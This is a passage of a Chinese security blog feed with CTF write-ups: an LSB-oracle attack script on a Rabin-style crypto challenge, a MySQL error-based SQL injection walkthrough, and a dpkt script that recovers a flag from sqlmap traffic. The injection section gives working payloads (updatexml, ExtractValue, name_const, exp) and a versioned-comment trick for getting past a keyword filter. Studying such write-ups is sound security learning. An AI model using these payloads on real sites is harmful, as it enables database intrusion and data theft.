class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> GCD, bytes_to_long, long_to_bytes</span><br><span class="line"><span class="keyword">import</span> math</span><br><span class="line"></span><br><span class="line">FLAG = <span class="string">"testtesttesttesttesttest"</span></span><br><span class="line">p = <span class="number">9106955210961894382213398084695411548991508552135116475739483485343599066229167723931080143408618040894126850992819734177810259561241614741757319165906087L</span></span><br><span class="line">q = <span class="number">10285773789873373607105204107746706058912747747297377854417892145690734334799058020026041693440549801695363225930871791013981165203481480366182233263169487L</span></span><br><span class="line">N = p * q</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">legendreSymbol</span><span class="params">(a, p)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> pow(a, (p-<span class="number">1</span>)/<span class="number">2</span>, p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(c, p, q)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> GCD(c, p*q) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"bad1"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">if</span> legendreSymbol(c, p) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"bad2"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">if</span> legendreSymbol(c, q) != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"bad3"</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">return</span> pow(c, ((p-<span class="number">1</span>)*(q-<span class="number">1</span>) + <span class="number">4</span>) / <span class="number">8</span>, p*q)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span><span class="params">(m, N)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> pow(m, <span class="number">2</span>, N)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pad</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span>(len(s) &lt; N.bit_length() / <span class="number">8</span>)</span><br><span class="line">    padded = bytes_to_long(s.ljust(N.bit_length()/<span class="number">8</span>, <span class="string">"0"</span>))</span><br><span class="line">    <span class="keyword">while</span> decrypt(padded, p, q) == <span class="keyword">None</span>:</span><br><span class="line">        padded += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> padded</span><br><span class="line"></span><br><span class="line">msg = <span class="string">"""Welcome to the LSB oracle! N = &#123;&#125;\n"""</span>.format(N)</span><br><span class="line"><span class="keyword">print</span> msg</span><br><span class="line">padded = pad(FLAG)</span><br><span class="line"><span class="keyword">print</span> padded</span><br><span class="line">enc_flag = encrypt(padded, N)</span><br><span class="line"><span class="keyword">assert</span> long_to_bytes(padded)[:len(FLAG)] == FLAG</span><br><span class="line"><span class="keyword">assert</span> decrypt(enc_flag, p, q) == padded</span><br><span class="line"><span class="keyword">assert</span> decrypt(<span class="number">2</span>, p, q) != <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"Encrypted Flag: &#123;&#125;\n"</span>.format(enc_flag)</span><br><span class="line"></span><br><span class="line">m = decrypt(enc_flag, p, q)</span><br><span class="line"></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment">#   x = raw_input("Give a ciphertext: ")</span></span><br><span class="line"><span class="comment">#   x = long(x)</span></span><br><span class="line"><span class="comment">#   m = decrypt(x, p, q)</span></span><br><span class="line"><span class="comment">#   # print m</span></span><br><span class="line"><span class="comment">#   if m is None:</span></span><br><span class="line"><span class="comment">#       m = 0</span></span><br><span class="line"><span class="comment">#   print "lsb is &#123;&#125;\n".format(m % 2)</span></span><br><span class="line"></span><br><span class="line">flag_lower_bound = <span class="number">0</span></span><br><span class="line">flag_upper_bound = N</span><br><span class="line">mult = <span class="number">0</span></span><br><span class="line">c = enc_flag</span><br><span class="line">iter_count = math.log(N, <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">0</span>, long(math.ceil(long(iter_count)))):</span><br><span class="line">    c = ((encrypt(<span class="number">2</span>, N) * c) % N)</span><br><span class="line">    mult += <span class="number">1</span></span><br><span class="line">    print(<span class="string">"upper = %d"</span> % flag_upper_bound)</span><br><span class="line">    print(<span class="string">"upper flag = %s"</span> % long_to_bytes(flag_upper_bound))</span><br><span class="line">    print(<span class="string">"lower = %d"</span> % flag_lower_bound)</span><br><span class="line">    print(<span class="string">"lower flag = %s"</span> % long_to_bytes(flag_lower_bound))</span><br><span class="line">    print(<span class="string">"multiplier = %d"</span> % mult)</span><br><span class="line">    mm = decrypt(c, p, q)</span><br><span class="line">    <span class="keyword">if</span> mm <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        mm = <span class="number">0</span></span><br><span class="line">    <span class="keyword">if</span> mm % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        flag_upper_bound = (flag_upper_bound + flag_lower_bound) / <span class="number">2</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag_lower_bound = (flag_upper_bound + flag_lower_bound) / <span class="number">2</span></span><br></pre></td></tr></table></figure></p>
<h2 id="LSB_oracle_attack">LSB oracle attack</h2><p>因为N是Blum Integer, 所以$p\ mod\ 4 = 3\ \&amp;&amp;\ q\ mod\ 4 = 3$</p>
<p>可以得出: $N\ mod\ 4 = 1$，或者$N\ mod\ 2 = 1$，所以N是odd<br>设ev为even, 我们可得出结论:<br>$$\begin{cases}<br>if\ ev &lt; N\ then\ ev\ mod\ N = \{even\}\\<br>if\ 2N &gt; ev &gt; N\ then\ ev\ mod\ N = \{odd\}\\<br>if\ 3N &gt; ev &gt; 2N\ then\ ev\ mod\ N = \{even\}\\<br>\ldots<br>\end{cases}<br>$$</p>
<p>简单的来说，对于一个RSA加密：<br>$m^e\ mod\ N = c$ 乘以 $2^e\ mod\ N = c_2$<br>得到<br>$$(2*m)^e\ mod\ N = c * c_2\ mod\ N = CC$$<br>然后把CC拿去解密<br>$$CC^d\ mod\ N = (2 * m)^{e*d}\ mod\ N = 2*m\ mod\ N = MM$$</p>
<p>从上面的结论我们可以得出:<br>$$\begin{cases}<br>if\ MM\ is\ \{odd\}\ then\ 2*m &gt; N\\<br>if\ MM\ is\ \{even\}\ then\ 2*m &lt; N<br>\end{cases}<br>$$</p>
<p>本题就是利用这样的方法来确定出flag的范围，然后逐渐缩小范围，到最后确定值，我再多推一步，这一步理解了就可以全部理解了<br>下一步用$m^e\ mod\ N = c$ 乘以 $4^e\ mod\ N = c_2$<br>得到<br>$$(4*m)^e\ mod\ N = c * c_2\ mod\ N = CC_2$$</p>
<p>然后把$CC_2$拿去解密<br>$$CC_{2}^{d}\ mod\ N = (4 * m)^{e*d}\ mod\ N = 4*m\ mod\ N = MM_2$$</p>
<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> MM is odd:</span><br><span class="line">    <span class="keyword">if</span> <span class="label">$MM_2</span>$ is odd:</span><br><span class="line">        3N &lt; 4 * <span class="keyword">m</span> &lt; 4N</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        2N &lt; 4 * <span class="keyword">m</span> &lt; 3N</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="label">$MM_2</span>$ is odd:</span><br><span class="line">        <span class="keyword">N</span> &lt; 4 * <span class="keyword">m</span> &lt; 2N</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        0 &lt; 4 * <span class="keyword">m</span> &lt; <span class="keyword">N</span></span><br></pre></td></tr></table></figure>
<p>这题从头到尾我都想错了方法，而且我只是自己一个人蒙头苦算，注意收集和脚本中的信息，去google搜索，也许这题就能撸出来了.</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>这周的PCTF撸了两道Crypto, 果然我只是民科….(ノಠ益ಠ)ノ彡┻━┻</p>]]>
    
    </summary>
    
      <category term="CTF" scheme="http://0x48.pw/tags/CTF/"/>
    
      <category term="Crypto" scheme="http://0x48.pw/tags/Crypto/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[MySQLi-Error Injection]]></title>
    <link href="http://0x48.pw/2016/04/08/0x18/"/>
    <id>http://0x48.pw/2016/04/08/0x18/</id>
    <published>2016-04-08T09:52:02.000Z</published>
    <updated>2016-04-08T11:50:04.016Z</updated>
    <content type="html"><![CDATA[<p>本篇文章源于一道三个白帽的题目</p>
<a id="more"></a>
<p>该题源码<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="preprocessor">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'config.php'</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="keyword">array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> <span class="variable">$key</span>)&#123;</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$$key</span> <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(is_array(<span class="variable">$v</span>))&#123;</span><br><span class="line">            errorBox(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$k</span>[<span class="number">0</span>] !=<span class="string">'_'</span>?<span class="variable">$$k</span> = addslashes(<span class="variable">$v</span>):<span class="variable">$$k</span> = <span class="string">""</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span><span class="params">(<span class="variable">$str</span>)</span></span>&#123;</span><br><span class="line">    <span class="variable">$rstr</span> = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;strlen(<span class="variable">$str</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(ord(<span class="variable">$str</span>[<span class="variable">$i</span>])&gt;<span class="number">31</span> &amp;&amp; ord(<span class="variable">$str</span>[<span class="variable">$i</span>])&lt;<span class="number">127</span>)&#123;</span><br><span class="line">            <span class="variable">$rstr</span> = <span class="variable">$rstr</span>.<span class="variable">$str</span>[<span class="variable">$i</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$rstr</span> = str_replace(<span class="string">'\''</span>,<span class="string">''</span>,<span class="variable">$rstr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$rstr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$message</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/\b(select|insert|update|delete)\b/i"</span>,<span class="variable">$message</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(filter(<span class="variable">$message</span>) !== <span class="variable">$message</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"hello,sangebaimao!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$sql</span>=<span class="string">"insert guestbook(`message`) value('$message');"</span>;</span><br><span class="line">    mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"select * from guestbook order by id limit 0,5;"</span>;</span><br><span class="line">    <span class="variable">$result</span> = mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$result</span>)&#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>))&#123;</span><br><span class="line">            <span class="variable">$id</span> = <span class="variable">$row</span>[<span class="string">'id'</span>];</span><br><span class="line">            <span class="variable">$message</span> = <span class="variable">$row</span>[<span class="string">'message'</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"|$id|=&gt;|$message|&lt;br/&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$message</span> = stripcslashes(<span class="variable">$message</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">"delete from guestbook where id=$id or message ='$message';"</span>;</span><br><span class="line">    <span class="keyword">if</span>(!mysql_query(<span class="variable">$sql</span>))&#123;</span><br><span class="line">        <span class="keyword">print</span>(mysql_error());</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">"delete from guestbook where id=$id"</span>;</span><br><span class="line">        mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="preprocessor">?&gt;</span></span></span><br></pre></td></tr></table></figure></p>
<p>这题读完一遍源码之后，就知道需要bypass单引号和<code>preg_match(&quot;/\b(select|insert|update|delete)\b/i&quot;,$message)</code>， 然后是二次注入+报错注入.</p>
<p>bypass单引号是借助<code>stripcslashes($message);</code>该函数，所以使用<code>?message=aaa\x27</code> 来bypass单引号，这不是本篇重点，就不多说了。</p>
<p>然后使用<code>/*!00000select*/</code> 来bypass <code>preg_match(&quot;/\b(select|insert|update|delete)\b/i&quot;,$message)</code></p>
<p><code>/*!*/</code> 只在mysql中有用，在别的数据库中这只是注释，但是在mysql，<code>/*!select 1*/</code>可以成功执行，在语句前可以加上5位数字，代表版本号，表示只有在大于该版本的mysql中不作为注释<br>eg:<br><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">mysql&gt; select version();</span><br><span class="line">+-----------+</span></span><br><span class="line"><span class="header">| version() |</span><br><span class="line">+-----------+</span></span><br><span class="line"><span class="header">| 5.7.9-log |</span><br><span class="line">+-----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"><span class="header">mysql&gt; select /*!50709version()*/;</span><br><span class="line">+-----------+</span></span><br><span class="line"><span class="header">| version() |</span><br><span class="line">+-----------+</span></span><br><span class="line"><span class="header">| 5.7.9-log |</span><br><span class="line">+-----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select /<span class="strong">*!50710version()*</span>/;</span><br><span class="line">ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' at line 1</span><br></pre></td></tr></table></figure></p>
<p>好了，现在可以进行注入了，因为有一句<code>print(mysql_error());</code>，所以可以报错注入了：<br><del>报错注入是从写bug中发现的么？</del></p>
<h2 id="使用updatexml">使用updatexml</h2><p>payload:<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27 and updatexml<span class="params">(<span class="number">0</span>,concat<span class="params">(<span class="number">0</span>x27,<span class="params">(/*!<span class="number">00000</span>select version<span class="params">()</span>*/)</span>)</span>,<span class="number">0</span>)</span><span class="built_in">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p><code>UpdateXML(xml_target, xpath_expr, new_xml)</code><br>updatexml函数有三个参数，作用是xml替换，把<code>xml_target</code>中被<code>xpath_expr</code>匹配到的部分使用<code>new_xml</code>替换</p>
<p>这个报错注入的原理是利用updatexml的参数错误，首先不能有语法错误，要不然注入的语句根本无法执行，语法正确后，先去执行<code>concat(0x27,(/*!00000select version()*/))</code>,得到<code>&#39;5.5.42-log</code>,作为第二个参数传入updatexml函数中，而updatexml第二个参数为xml的匹配表达式，单引号为非法字符，因此报错，输出错误内容<code>&#39;5.5.42-log</code>, 因此得到了你想要得到的数据</p>
<h2 id="使用ExtractValue()">使用ExtractValue()</h2><p>payload:<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27 and ExtractValue<span class="params">(<span class="number">0</span>,concat<span class="params">(<span class="number">0</span>x27,<span class="params">(/*!<span class="number">00000</span>select version<span class="params">()</span>*/)</span>)</span>)</span><span class="built_in">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<p>这个同理上面的，不过区别是<br><code>ExtractValue(xml_frag, xpath_expr)</code> 得到<code>xml_frag</code>中被<code>xpath_expr</code>匹配到的值</p>
<p>不过extractvalue和updatexml有个缺陷是，报错数据最大长度为32</p>
<h2 id="使用name_const">使用name_const</h2><p>payload:<br><figure class="highlight openscad"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27<span class="built_in">%</span><span class="number">20</span>and<span class="built_in">%</span><span class="number">20</span><span class="params">(/*!<span class="number">00000</span>SELECT*/ * FROM<span class="params">(/*!<span class="number">00000</span>SELECT*/<span class="params">(name_const<span class="params">(version<span class="params">()</span>,<span class="number">1</span>)</span>)</span>,name_const<span class="params">(version<span class="params">()</span>,<span class="number">1</span>)</span>)</span>a)</span><span class="built_in">%</span><span class="number">23</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="header">mysql&gt; select name_const('a','b');</span><br><span class="line">+------+</span></span><br><span class="line"><span class="header">| a    |</span><br><span class="line">+------+</span></span><br><span class="line"><span class="header">| b    |</span><br><span class="line">+------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; /<span class="strong">*!00000SELECT*</span>/(name<span class="emphasis">_const(version(),1)),name_</span>const(version(),1); <span class="code">+-----------+</span>-----------+</span><br><span class="line"><span class="header">| 5.7.9-log | 5.7.9-log |</span><br><span class="line">+-----------+-----------+</span></span><br><span class="line"><span class="header">|         1 |         1 |</span><br><span class="line">+-----------+-----------+</span></span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure>
<p>本题利用的是表的字段名不允许重复，报错长度没有限制</p>
<h2 id="利用exp报错">利用exp报错</h2><p>payload:<br><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?message=aaa\x27 and (/<span class="keyword">*</span>!00000select exp(~(/<span class="keyword">*</span>!00000select<span class="keyword">*</span>/ <span class="keyword">*</span> from (/<span class="keyword">*</span>!00000select<span class="keyword">*</span>/ version())a)))%23</span><br></pre></td></tr></table></figure></p>
<p>利用double型溢出，可参考<a href="http://drops.wooyun.org/tips/8166" target="_blank" rel="external">http://drops.wooyun.org/tips/8166</a></p>
<h2 id="利用floor报错">利用floor报错</h2><p>可参考<a href="http://www.jinglingshu.org/?p=4507" target="_blank" rel="external">http://www.jinglingshu.org/?p=4507</a>, 对于<code>floor</code> 报错注入我理解的不是特别透彻</p>
<h2 id="利用join报错">利用join报错</h2><p><code>join</code> 可用来报列名，同样可参考上面那个链接，本题不是一个很好的join报错案例</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>本篇文章源于一道三个白帽的题目</p>]]>
    
    </summary>
    
      <category term="SQLi" scheme="http://0x48.pw/tags/SQLi/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Python 使用dpkt分析数据包]]></title>
    <link href="http://0x48.pw/2016/04/04/0x17/"/>
    <id>http://0x48.pw/2016/04/04/0x17/</id>
    <published>2016-04-04T14:50:47.000Z</published>
    <updated>2016-04-04T15:29:28.216Z</updated>
    <content type="html"><![CDATA[<p>上周Lightless放了一题数据包分析的题，挺有意思的</p>
<a id="more"></a>
<p>题目地址: <a href="http://7xscw6.com1.z0.glb.clouddn.com/hahaha.pcapng" target="_blank" rel="external">http://7xscw6.com1.z0.glb.clouddn.com/hahaha.pcapng</a></p>
<p>数据包分析这部分很简单，随便看看可以看出来这是个用sqlmap去艹服务器的数据包，然后flag使用盲注注出来的.</p>
<p>最简单的方法就是手工把盲注的包提取出来，手工分析得到flag.</p>
<p>不过我觉得手工太low了，所以有了这篇文章，使用Python的dpkt包对pcap包进行分析.</p>
<p>直接先贴代码：<br><figure class="highlight nimrod"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dpkt.ethernet <span class="keyword">import</span> <span class="type">Ethernet</span></span><br><span class="line"><span class="keyword">import</span> dpkt</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"></span><br><span class="line"><span class="literal">result</span> = []</span><br><span class="line">f = file(<span class="string">"test.pcapng"</span>)</span><br><span class="line">pcap = dpkt.pcapng.<span class="type">Reader</span>(f)</span><br><span class="line">(ts, buf) = pcap.next()</span><br><span class="line"><span class="keyword">while</span> <span class="type">True</span>:</span><br><span class="line">    http_data = <span class="type">Ethernet</span>(buf).data.data.data</span><br><span class="line">    request = dpkt.http.<span class="type">Request</span>(http_data)</span><br><span class="line">    (ts, buf) = pcap.next()</span><br><span class="line">    http_data = <span class="type">Ethernet</span>(buf).data.data.data</span><br><span class="line">    response = dpkt.http.<span class="type">Response</span>(http_data)</span><br><span class="line">    payload = urllib.unquote(request.uri)</span><br><span class="line">    entity_body = response.entity_body</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"ctf.flag "</span> <span class="keyword">in</span> payload:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"123456"</span> <span class="keyword">in</span> entity_body:</span><br><span class="line">            <span class="literal">result</span>.append(&#123;<span class="string">"payload"</span>: payload, <span class="string">"result"</span>: <span class="type">True</span>&#125;)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="literal">result</span>.append(&#123;<span class="string">"payload"</span>: payload, <span class="string">"result"</span>: <span class="type">False</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        (ts, buf) = pcap.next()</span><br><span class="line">    <span class="keyword">except</span> <span class="type">StopIteration</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">number = <span class="number">1</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> y <span class="keyword">in</span> <span class="literal">result</span>:</span><br><span class="line">    [(x, h)] = re.findall(<span class="string">"1\),(\d+).+&gt;(\d+)"</span>, y['payload'])</span><br><span class="line">    x, h = <span class="type">int</span>(x), <span class="type">int</span>(h)</span><br><span class="line">    <span class="keyword">if</span> x &gt; number:</span><br><span class="line">        number = x</span><br><span class="line">        flag += chr(c)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> y['<span class="literal">result</span>']:</span><br><span class="line">            c = h + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">print flag</span><br></pre></td></tr></table></figure></p>
<p>因为dpkt包的setfilter方法是没用的，感觉是作者还没把dpkt写完<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">setfilter</span><span class="params">(self, value, optimize=<span class="number">1</span>)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> NotImplementedError</span><br></pre></td></tr></table></figure></p>
<p>所以我用wireshark过滤出了http包：<a href="http://7xscw6.com1.z0.glb.clouddn.com/test.pcapng" target="_blank" rel="external">http://7xscw6.com1.z0.glb.clouddn.com/test.pcapng</a></p>
<p>然后由于http包实体内容使用了gzip压缩，所以我魔改了<code>http.py</code><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Response</span><span class="params">(Message)</span>:</span></span><br><span class="line">    <span class="string">"""Hypertext Transfer Protocol Response."""</span></span><br><span class="line">    __hdr_defaults__ = &#123;</span><br><span class="line">        <span class="string">'version'</span>: <span class="string">'1.0'</span>,</span><br><span class="line">        <span class="string">'status'</span>: <span class="string">'200'</span>,</span><br><span class="line">        <span class="string">'reason'</span>: <span class="string">'OK'</span></span><br><span class="line">    &#125;</span><br><span class="line">    __proto = <span class="string">'HTTP'</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, *args, **kwargs)</span>:</span></span><br><span class="line">        Message.__init__(self, *args, **kwargs)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            entity = gzip.Gzip(self.body)</span><br><span class="line">            self.entity_body = gzip.Gzip.decompress(entity)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            self.entity_body = <span class="string">""</span></span><br></pre></td></tr></table></figure></p>
<p>加了一个<code>__init__</code></p>
<p>然后，代码短，也容易看懂，不过还有需要优化的地方，不过跑这题确是没问题的</p>
]]></content>
    <summary type="html">
    <![CDATA[<p>上周Lightless放了一题数据包分析的题，挺有意思的</p>]]>
    
    </summary>
    
      <category term="Python" scheme="http://0x48.pw/tags/Python/"/>
    
      <category term="H-blog" scheme="http://0x48.pw/categories/H-blog/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[CRYPTO技能修正]]></title>
